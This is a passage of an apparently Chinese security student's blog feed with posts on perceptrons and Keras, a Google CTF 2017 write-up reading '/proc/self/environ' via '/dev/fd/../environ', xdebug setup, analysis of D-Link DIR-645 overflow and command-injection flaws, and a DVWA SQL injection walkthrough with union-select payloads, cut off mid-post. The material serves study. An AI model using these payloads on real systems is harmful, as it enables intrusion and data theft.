        &lt;h1&gt;php-challenge 9&lt;/h1&gt;
&lt;p&gt;第一次接触到这个题目，被惊呆了&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/sp
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>deep learning1</title>
    <link href="https://prontosil.club/2019/07/21/deep-learning1/"/>
    <id>https://prontosil.club/2019/07/21/deep-learning1/</id>
    <published>2019-07-21T08:07:58.000Z</published>
    <updated>2019-07-22T05:46:10.996Z</updated>
    
    <content type="html"><![CDATA[<h3>感知机补充</h3><p>接着写</p><p>感知机的训练中，老师还提供了一部份资料，比如训练出$y=2x$</p><p>我们简要地看一下一次训练的结果：</p><table><thead><tr><th>bias</th><th>x</th><th>y</th><th>w0</th><th>w1</th><th>yout</th><th>y-yout</th><th>adj0</th><th>adj1</th><th>alpha</th><th>w0new</th><th>w1new</th></tr></thead><tbody><tr><td>1</td><td>0.512</td><td>1.023</td><td>0.719</td><td>0.403</td><td>0.926</td><td>0.977</td><td>0.977</td><td>0.500</td><td>0.7</td><td>0.788</td><td>0.438</td></tr></tbody></table><p>进行很多次训练之后画出的图形：<img src="https://i.loli.net/2019/07/10/5d2533696b1e993944.png" alt=""></p><p>预测的还是挺准确的</p><h3>为什么需要bias？</h3><p>概念上很好理解，bias就是将一个正比例函数变为了一次函数，这样不必每次都过原点，分类的准确性也就大大地提高了</p><h2>多层感知机</h2><p>一层的感知机是没办法处理异或问题的</p><p>所以需要增加隐藏层就像下面这样：<img src="https://i.loli.net/2019/07/10/5d25354fec71179261.png" alt="">这样就可以做到了：</p><p><img src="https://i.loli.net/2019/07/10/5d253567b050673436.png" alt=""></p><p>感觉MLP的数学知识太过复杂了，暂时放着</p><h2>keras</h2><p>从栗子代码开始：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"></span><br><span class="line">model = Sequential()</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Dense</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">使用add来堆叠模型</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">model.add(Dense(units=<span class="number">64</span>, activation=<span class="string">'relu'</span>, input_dim=<span class="number">100</span>))</span><br><span class="line">model.add(Dense(units=<span class="number">10</span>, activation=<span class="string">'softmax'</span>))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">使用compile来配置学习过程</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">model.compile(loss=<span class="string">'categorical_crossentropy'</span>,</span><br><span class="line">              optimizer=<span class="string">'sgd'</span>,</span><br><span class="line">              metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line"><span class="comment"># x_train 和 y_train 是 Numpy 数组 -- 就像在 Scikit-Learn API 中一样。</span></span><br><span class="line">model.fit(x_train, y_train, epochs=<span class="number">5</span>, batch_size=<span class="number">32</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">评估模型</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">loss_and_metrics = model.evaluate(x_test, y_test, batch_size=<span class="number">128</span>)</span><br><span class="line">classes = model.predict(x_test, batch_size=<span class="number">128</span>)</span><br></pre></td></tr></table></figure></p><h3>Sequential</h3><h3>compile</h3><p>在训练模型之前，需要配置学习过程，compile接收三个参数</p><ul><li>优化器optimizer</li><li>损失函数loss</li><li>评估标准metrics</li></ul><p>一个个来看</p><ol><li><p>优化器可以先实例化一个优化器对象，然后将它传入<code>model.compile()</code>，或者可以通过</p></li><li><p>损失函数</p></li></ol><p>损失函数（或称目标函数、优化评分函数）是编译模型时所需的两个参数之一：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.compile(loss=<span class="string">'mean_squared_error'</span>, optimizer=<span class="string">'sgd'</span>)</span><br></pre></td></tr></table></figure></p><p>我们可以传递一个现有的损失函数名，或者一个tensorflow符号函数，有以下两个参数</p><ul><li>y_true: 真实标签.</li><li>y_pred: 预测值,其shape与y_true相同</li></ul><p>可用的损失函数：mean_squared_errormean_absolute_error等</p><h2>参考</h2><p><a href="https://blog.csdn.net/xwd18280820053/article/details/70681750" target="_blank" rel="noopener">神经网络中w,b参数的作用（为何需要偏置b的解释）</a><a href="https://blog.csdn.net/hy13684802853/article/details/78717475" target="_blank" rel="noopener">深度学习中偏移项bias的作用</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;感知机补充&lt;/h3&gt;
&lt;p&gt;接着写&lt;/p&gt;
&lt;p&gt;感知机的训练中，老师还提供了一部份资料，比如训练出$y=2x$&lt;/p&gt;
&lt;p&gt;我们简要地看一下一次训练的结果：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;bias&lt;/th&gt;
&lt;th&gt;x&lt;/th&gt;
&lt;th&gt;y
      
    
    </summary>
    
      <category term="deep learning" scheme="https://prontosil.club/categories/deep-learning/"/>
    
    
  </entry>
  
  <entry>
    <title>deep learning0</title>
    <link href="https://prontosil.club/2019/07/21/deep-learning0/"/>
    <id>https://prontosil.club/2019/07/21/deep-learning0/</id>
    <published>2019-07-21T08:07:44.000Z</published>
    <updated>2019-07-22T05:26:27.393Z</updated>
    
    <content type="html"><![CDATA[<h1>deep learning</h1><p>整理一下上课的笔记，不然全都会忘了去</p><h2>无监督学习</h2><p><code>self organizing map</code> 简称SOM算法</p><p>大意：给定一个向量$v_{k}$,寻找到距离最近的神经元</p><ul><li><p>找到最接近的神经元$$n_{bmu}=\underset{1\leqslant i\leqslant m}{argmin}\left | v_{k}-n_{i} \right |$$</p></li><li><p>更新$n_{i}$</p></li></ul><p>wikipedia上一张很形象的图片:</p><blockquote><p>蓝色斑点是训练数据的分布，小白色光盘是从该分布中抽取的当前训练数据。首先（左），SOM节点任意地位于数据空间中。选择最接近训练基准的节点（以黄色突出显示）。它被移向训练数据，因为（在较小程度上）是它在网格上的邻居。在多次迭代之后，网格倾向于近似数据分布（右）。</p></blockquote><p><img src="https://i.loli.net/2019/07/07/5d22023bd954e64199.png" alt=""></p><h2>有监督学习</h2><h3>数学知识</h3><h4>特征向量</h4><p>线性代数中的特征向量：</p><blockquote><p>对于一个给定的方阵A，它的特征向量v经过线性变化之后，得到的新向量仍然与原来的v保持在同一条直线上，但其长度或方向也许会改变，即：$$Av=\lambda v$$此时$v$就是矩阵$A$的特征向量，$\lambda$就是对应的特征值</p></blockquote><p>进一步：在一定条件下，一个变换可以由其特征值特征向量完全表述，也就是说，所有的特征向量组成了这向量空间的一组基底。一个特征空间是具有相同特征值的特征向量与一个同维数的零向量的集合，比如$E_{\lambda }=\left { u\in V | Au=\lambda u\right }$即为线性变化$A$中以$\lambda$为特征值的特征空间</p><p>抽象概念不容易理解，举几个栗子：</p><ul><li>恒等变换$I$的特征向量$$I(v)=v=1\cdot v$$可以看到所有的特征向量都是恒等变换$I$的特征向量，恒等变换的特征空间只有一个就是整个空间</li><li>类似的，数乘变换$\lambda I$的特征向量也是所有的非零向量，因为按照定义：$$\lambda I(v) = \lambda \cdot v$$</li></ul><h3>感知器</h3><p>看张图：</p><p><img src="https://i.imgur.com/Uo24IIn.png" alt="Ncell"></p><p>数学表述为：$t = f(\sum <em>{i=1}^{n} w</em>{i}x_{i} + b) = f(\mathbf{w}^{T} \mathbf{x})$</p><p>f函数的表达式：$$f(x) = \left{\begin{matrix}1 &amp; if , w \cdot x + b &gt; 0 \0 &amp; else\end{matrix}\right.$$</p><p>$\mathbf{x} = \left [ x_{1}, x_{2} ... , x_{n} , \ 1 \right]^{T}$, $\mathbf{w} = \left [ w_{1}, w_{2} , ...w_{n} , \ b \right]^{T}$</p><p>如何训练？</p><p>我们来看一个训练与运算的demo<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">  <span class="string">'''</span></span><br><span class="line"><span class="string">  加载数据，input_data和labels对应</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">    input_data = [[<span class="number">1</span>, <span class="number">1</span>], [<span class="number">0</span>, <span class="number">0</span>], [<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>]]</span><br><span class="line">    labels = [<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> input_data, labels</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train_pre</span><span class="params">(input_data, y, iteration, rate)</span>:</span></span><br><span class="line">  <span class="string">'''</span></span><br><span class="line"><span class="string">  训练，更新w和b</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">    unit_step = <span class="keyword">lambda</span> x: <span class="number">0</span> <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    w = np.random.rand(len(input_data[<span class="number">0</span>]))</span><br><span class="line">    bias = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(iteration):</span><br><span class="line">        samples = zip(input_data, y)</span><br><span class="line">        <span class="keyword">for</span> (input_i, label) <span class="keyword">in</span> samples:</span><br><span class="line">            result = input_i * w + bias</span><br><span class="line">            result = float(sum(result))</span><br><span class="line">            y_pred = float(unit_step(result))</span><br><span class="line">            w = w + rate * (label - y_pred) * np.array(input_i)</span><br><span class="line">            bias = rate * (label - y_pred)</span><br><span class="line">    <span class="keyword">return</span> w, bias</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">predict</span><span class="params">(input_i, w, b)</span>:</span></span><br><span class="line">  <span class="string">'''</span></span><br><span class="line"><span class="string">  预测</span></span><br><span class="line"><span class="string">  '''</span></span><br><span class="line">    unit_step = <span class="keyword">lambda</span> x: <span class="number">0</span> <span class="keyword">if</span> x &lt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">1</span></span><br><span class="line">    result = input_i * w + b</span><br><span class="line">    result = sum(result)</span><br><span class="line">    y_pred = float(unit_step(result))</span><br><span class="line">    print(y_pred)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    input_data, y = load_data()</span><br><span class="line">    w, b = train_pre(input_data, y, <span class="number">20</span>, <span class="number">0.01</span>)</span><br><span class="line">    predict([<span class="number">1</span>, <span class="number">1</span>], w, b)</span><br></pre></td></tr></table></figure></p><p>我们很惊讶地发现一个如此简单地模型竟然不可思议地完成了这个任务。数据更新：$w(j) := w(j) + \alpha (y-f(x))x(j) (j = 1,...n)$</p><h3>异或问题</h3><p>当时老师上课时候提到异或问题是不可解的，后来查了一下资料才明白在神经网络发展的早期，异或问题确实是不可解的，不过通过加入隐藏层使得异或问题能够有了新的解法</p><p>如下图：<img src="https://i.loli.net/2019/07/07/5d2204580b53040600.png" alt=""></p><p>复习的时候才注意到原来老师提到了通过加入隐藏层的方式来解决异或问题</p><p><img src="https://i.loli.net/2019/07/07/5d220559de3ef92755.png" alt=""></p><h2>参考资料</h2><p><a href="https://www.cnblogs.com/Belter/p/6711160.html" target="_blank" rel="noopener">【机器学习】神经网络实现异或（XOR）</a><a href="https://zhuanlan.zhihu.com/p/25736962" target="_blank" rel="noopener">1.5 图形化理解神经网络中的异或问题</a><a href="https://zh.wikipedia.org/wiki/%E6%84%9F%E7%9F%A5%E5%99%A8" target="_blank" rel="noopener">感知器 wikipedia</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;deep learning&lt;/h1&gt;
&lt;p&gt;整理一下上课的笔记，不然全都会忘了去&lt;/p&gt;
&lt;h2&gt;无监督学习&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;self organizing map&lt;/code&gt; 简称SOM算法&lt;/p&gt;
&lt;p&gt;大意：给定一个向量$v_{k}$,寻找到距离最近的
      
    
    </summary>
    
      <category term="deep learning" scheme="https://prontosil.club/categories/deep-learning/"/>
    
    
  </entry>
  
  <entry>
    <title>从Googlectf一道题认识一下链接文件</title>
    <link href="https://prontosil.club/2019/07/21/%E4%BB%8EGooglectf%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86%E4%B8%80%E4%B8%8B%E9%93%BE%E6%8E%A5%E6%96%87%E4%BB%B6/"/>
    <id>https://prontosil.club/2019/07/21/从Googlectf一道题认识一下链接文件/</id>
    <published>2019-07-21T08:07:06.000Z</published>
    <updated>2019-07-21T08:09:01.831Z</updated>
    
    <content type="html"><![CDATA[<h1>Linux目录</h1><p>源自Googlectf2017的一道题</p><p><img src="https://miro.medium.com/max/1094/1*A0WzQ3KOMSLvPFog50KRfQ.png" alt="">可以通过f参数直接读取到想读的文件flag藏在 <code>/proc/environ</code>中，怎么才能进入到这个目录？</p><p>Linux中有一个叫做<code>symlink method</code>也就是相当于一个快捷方式，但是却不同于Windows中的shortcut而正好：<code>/dev/fd</code>这个指向了<code>/proc/self/fd</code>这样payload就不难理解了：<code>/dev/fd/../environ</code>访问<code>/dev/fd</code>就相当于访问了<code>/proc/self</code>之后回退一次就可以找到<code>environ</code>这个文件了</p><p>Linux中 <code>/dev/fd/0</code>运行效果是这样的，相当于你输入啥它就会回答啥<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> ✘ pxy@LAPTOP-UBIEP4K5  ~  sudo cat /dev/fd/0</span><br><span class="line">a</span><br><span class="line">a</span><br><span class="line">pxy</span><br><span class="line">pxy</span><br></pre></td></tr></table></figure></p><p>接下来了解一下ln命令</p><ul><li>软链接：英文<code>symbolic link</code>非常类似于Windows中的快捷方式</li><li>硬链接：英文<code>hard link</code>这类文件会拥有自己的inode节点和名称，其inode会指向文件内容所在的数据块emmm后面不是很懂了</li></ul><p>建立软链接的方式：<code>ln -s 源文件名称 软链接文件名称</code>目录和文件均可</p><p>现在当前吗目录下创建一个指向<code>/proc/sys</code>的链接<img src="https://i.imgur.com/RmHcXEq.png" alt="linux0"></p><p>然后我们就可以通过目录遍历来进入到其他的目录了。<img src="https://i.imgur.com/ssSnuQU.png" alt="linux1"></p><p>软链接还会存在这个问题：</p><p>链接的重复定义<img src="https://i.imgur.com/RESHwi3.png" alt="linux2"></p><p>这样就不会出问题了，加个<code>-n</code>选项<img src="https://i.imgur.com/sHZv4QY.png" alt="linux3"></p><p><a href="https://medium.com/@forwardsecrecy/google-ctf-2017-mindreader-570e8acf53b7" target="_blank" rel="noopener">参考</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;Linux目录&lt;/h1&gt;
&lt;p&gt;源自Googlectf2017的一道题&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://miro.medium.com/max/1094/1*A0WzQ3KOMSLvPFog50KRfQ.png&quot; alt=&quot;&quot;&gt;
可以通过f参数直接读取到
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://prontosil.club/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>vscode调试php</title>
    <link href="https://prontosil.club/2019/07/21/vscode%E8%B0%83%E8%AF%95php/"/>
    <id>https://prontosil.club/2019/07/21/vscode调试php/</id>
    <published>2019-07-21T08:06:48.000Z</published>
    <updated>2019-07-22T05:31:31.331Z</updated>
    
    <content type="html"><![CDATA[<h1>使用vscode调试php代码</h1><h2>下载xdebug</h2><p><a href="https://xdebug.org/download.php" target="_blank" rel="noopener">官网</a>但是需要自己确定php的版本和编译器的版本</p><p>但是官网的链接似乎有问题，php5.5的两个反过来了</p><p><img src="https://i.imgur.com/5GBV27o.png" alt="php1"></p><p>之后将其添加到<code>php.ini</code>文件中</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[XDebug]</span><br><span class="line">zend_extension = php_xdebug-2.5.5-5.5-vc11.dll</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_autostart = 1</span><br></pre></td></tr></table></figure></p><h2>将php添加到环境变量中</h2><p>这就不细说了</p><h2>配置vscode中的php路径</h2><p>在settings.json中指定</p><h2>调试</h2><p><img src="https://i.imgur.com/cbMm5FT.png" alt="php2"></p><h1>踩到的坑</h1><ol><li>VScode的php debug插件默认是用环境变量中的php来进行调试的，所以php如果没有加入到环境变量中的话是会报错的。</li><li>我刚开始用了wampserver的php来进行调试，但是后来失败了，说是没办法加载xdebug插件，所以换成了phpstudy</li><li>找不到setting文件？这个坑害惨了在这个地方需要添加php的路径<img src="https://i.imgur.com/l1Vx4cI.png" alt="php0"></li><li>两种调试方式，一种是listen for xdebug，需要打开浏览器，另一种是launch currently open script</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;使用vscode调试php代码&lt;/h1&gt;
&lt;h2&gt;下载xdebug&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://xdebug.org/download.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;官网&lt;/a&gt;
但是需要自己确定php的版本
      
    
    </summary>
    
      <category term="config" scheme="https://prontosil.club/categories/config/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="vscode" scheme="https://prontosil.club/tags/vscode/"/>
    
  </entry>
  
  <entry>
    <title>IOT D-link</title>
    <link href="https://prontosil.club/2019/07/20/IOT-D-link/"/>
    <id>https://prontosil.club/2019/07/20/IOT-D-link/</id>
    <published>2019-07-20T01:05:47.000Z</published>
    <updated>2019-07-22T05:25:28.879Z</updated>
    
    <content type="html"><![CDATA[<h1>DIR-815栈溢出漏洞</h1><p>屡次调试都失败了，我才发现原来这个版本的DIR-815已经修复了(DIR-815_REVB_FIRMWARE_2.03.B08)。所以这个栈溢出是不存在的</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0040BE04 move    $a3, $s2</span><br><span class="line">.text:0040BE08 la      $a2, aSSPostxml                  # &quot;%s/%s/postxml&quot;</span><br><span class="line">.text:0040BE0C move    $a0, $s1                         # s</span><br><span class="line">.text:0040BE10 li      $a1, 0x400                       # maxlen</span><br><span class="line">.text:0040BE14 jalr    $t9 ; snprintf</span><br><span class="line">.text:0040BE18 sw      $v0, 0x4F0+var_4E0($sp)</span><br><span class="line">.text:0040BE1C lw      $gp, 0x4F0+var_4D8($sp)</span><br><span class="line">.text:0040BE20 move    $a2, $s1</span><br><span class="line">.text:0040BE24 la      $t9, xmldbc_del</span><br></pre></td></tr></table></figure></p><h1>DIR-645 缓冲区溢出漏洞</h1><p>动态调试：在<code>authenticationcgi_main</code>处下断点</p><p>此时返回地址保存在这里：<img src="https://i.imgur.com/oh6ghYW.png" alt="645-0"></p><p>之后运行到此处：<img src="https://i.imgur.com/ANbYbap.png" alt="645-1"></p><p>此时返回地址被覆盖了<img src="https://i.imgur.com/FPyCjMv.png" alt="645-2"></p><p>继续运行，程序果然崩溃了<img src="https://i.imgur.com/FL4my7C.png" alt="645-3"></p><p>进入到函数<code>sub40A424</code>程序在此时崩溃了<img src="https://i.imgur.com/OXwIv4A.png" alt="645-4"></p><p>尝试修改password长度<img src="https://i.imgur.com/DVBCxyS.png" alt="645-5">程序还是崩溃了<img src="https://i.imgur.com/MpSoECY.png" alt="645-6">查看反汇编代码程序从外部读入<code>CONTENT_LENGTH</code>没有进行任何检查<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">text:0040B4A0                 la      $t9, getenv</span><br><span class="line">.text:0040B4A4                 la      $a0, aContent_length  # &quot;CONTENT_LENGTH&quot;</span><br><span class="line">.text:0040B4A8                 jalr    $t9 ; getenv</span><br><span class="line">.text:0040B4AC                 move    $s0, $v0</span><br><span class="line">.text:0040B4B0                 lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">.text:0040B4B4                 beqz    $s0, loc_40B610</span><br><span class="line">.text:0040B4B8                 addiu   $a0, $sp, 0xF90+var_938</span><br><span class="line">.text:0040B4BC                 beqz    $v0, loc_40B614</span><br><span class="line">.text:0040B4C0                 addiu   $a1, $sp, 0xF90+var_E1C</span><br><span class="line">.text:0040B4C4                 la      $t9, atoi</span><br><span class="line">.text:0040B4C8                 nop</span><br><span class="line">.text:0040B4CC                 jalr    $t9 ; atoi</span><br><span class="line">.text:0040B4D0                 move    $a0, $v0         # nptr</span><br><span class="line">.text:0040B4D4                 lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">.text:0040B4D8                 move    $s0, $v0</span><br><span class="line">.text:0040B4DC                 la      $v1, stdin</span><br><span class="line">.text:0040B4E0                 la      $t9, fileno</span><br><span class="line">.text:0040B4E4                 lw      $a0, (stdin - 0x4353CC)($v1)  # stream</span><br><span class="line">.text:0040B4E8                 jalr    $t9 ; fileno</span><br><span class="line">.text:0040B4EC                 addiu   $s1, $sp, 0xF90+var_430</span><br><span class="line">.text:0040B4F0                 lw      $gp, 0xF90+var_F78($sp)</span><br><span class="line">.text:0040B4F4                 move    $a0, $v0         # fd</span><br><span class="line">.text:0040B4F8                 la      $t9, read</span><br><span class="line">.text:0040B4FC                 move    $a1, $s1         # buf</span><br><span class="line">.text:0040B500                 jalr    $t9 ; read</span><br></pre></td></tr></table></figure></p><p>计算偏移量；<img src="https://i.imgur.com/a2gu75K.png" alt="645-7"></p><p>后面的利用过程感觉比较复杂，没能成功地复现</p><h1>DIR-645命令执行漏洞</h1><p>在安全客上看到了一篇分析DIR-645命令执行地文章，随分析一下原理</p><p>直接查看<code>servicecgi_main</code>函数</p><p>首先会对请求方法进行判断，如果是POST方法则会调用<code>cgibin_parse_request</code>解析参数，具体的实现暂时不考虑，主要是解析CONTENT_TYPE和CONTENT_LENGTH,之后会调用<code>sess_ispoweruser</code>判断是否为合法用户之后获取 POST 表单字段，若字段名为 EVENT 的话，就将 &quot;event %s &gt; /dev/null&quot; 作为参数执行 lxmldbc_system 函数。查看<code>lxmldbc_system</code>函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sw      $a1, 0x428+arg_4($sp)</span><br><span class="line">sw      $a2, 0x428+arg_8($sp)</span><br><span class="line">sw      $a3, 0x428+arg_C($sp)</span><br><span class="line">move    $a2, $a0         # format</span><br><span class="line">move    $a3, $v0         # arg</span><br><span class="line">move    $a0, $s0         # s</span><br><span class="line">sw      $v0, 0x428+var_410($sp)</span><br><span class="line">jalr    $t9 ; vsnprintf  </span><br><span class="line">li      $a1, 0x400       # maxlen</span><br></pre></td></tr></table></figure></p><p>主要关注最后两条指令，因为这里用到了MIPS中地分支延迟槽技术，所以<code>$a1</code>传递参数的指令存放在<code>jalr</code>指令之后故<code>vsnprintf($sp+0x428+var_40C,0x400,&quot;event %s &gt; /dev/null&quot;,arg_4)</code>vsnprintf函数的用法：</p><blockquote><p>函数原型：int vsnprintf(char str, size_t size, const char format,va_list ap);函数说明：将可变参数格式化输出到一个字符数组参数：str输出到的数组，size指定大小，防止越界，format格式化参数，ap可变参数列表函数用法</p></blockquote><p>接着调用system函数<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jalr    $t9 ; system</span><br><span class="line">move    $a0, $s0         # command</span><br></pre></td></tr></table></figure></p><p>看一下参数的传递过程<img src="https://i.imgur.com/GJkYz9r.png" alt="645-8"></p><p><code>$s0</code>本来是栈上的一个变量，<code>vsnprintf</code>将可变参数格式化输出到其中，之后又将其作为参数传递给<code>system</code>函数</p><p>相当于执行了<code>system(&quot;event %s &gt; /dev/null&quot;)</code></p><p>这样就可以想办法进行命令注入了</p><h1>参考</h1><p><a href="https://www.zybuluo.com/H4l0/note/1461277" target="_blank" rel="noopener">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1&gt;DIR-815栈溢出漏洞&lt;/h1&gt;
&lt;p&gt;屡次调试都失败了，我才发现原来这个版本的DIR-815已经修复了(DIR-815_REVB_FIRMWARE_2.03.B08)。
所以这个栈溢出是不存在的&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;highlight plai
      
    
    </summary>
    
      <category term="IOT" scheme="https://prontosil.club/categories/IOT/"/>
    
    
      <category term="IOT" scheme="https://prontosil.club/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>DVWA学习</title>
    <link href="https://prontosil.club/2019/07/20/DVWA%E5%AD%A6%E4%B9%A0/"/>
    <id>https://prontosil.club/2019/07/20/DVWA学习/</id>
    <published>2019-07-20T01:05:02.000Z</published>
    <updated>2019-07-29T15:32:38.758Z</updated>
    
    <content type="html"><![CDATA[<h1>DVWA</h1><p>用的vulstudy的环境默认用户名是<code>admin</code>密码是<code>password</code>需要启动的时候<code>docker-compose up -d</code>就行了停止的话<code>docker-compose stop</code>停止容器</p><h2>sql注入 最简单的</h2><p>没办法是我太菜了，权当复习好了 😢</p><p>输入1得到：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 1</span><br><span class="line">First name: admin</span><br><span class="line">Surname: admin</span><br></pre></td></tr></table></figure></p><p>然后开始爆字段</p><blockquote><p>1' order by 2 #</p></blockquote><p>确认回显位置：</p><blockquote><p>1' union select 1,2 #</p></blockquote><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos; union select 1,2 #</span><br><span class="line">First name: 1</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure></p><p>开始爆数据库</p><blockquote><p>1' union select database(),2 #得到数据库名<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ID: 1&apos; union select database(),2 #</span><br><span class="line">First name: dvwa</span><br><span class="line">Surname: 2</span><br></pre></td></tr></table></figure></p></blockquote><p>开始爆表表都存在<code>information_schema.tables</code>这里面</p><blockquote><p>1' union select table_name,2 from information_schema.tables where table_schema= 'dvwa'#</p></blockquote><p>得到：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 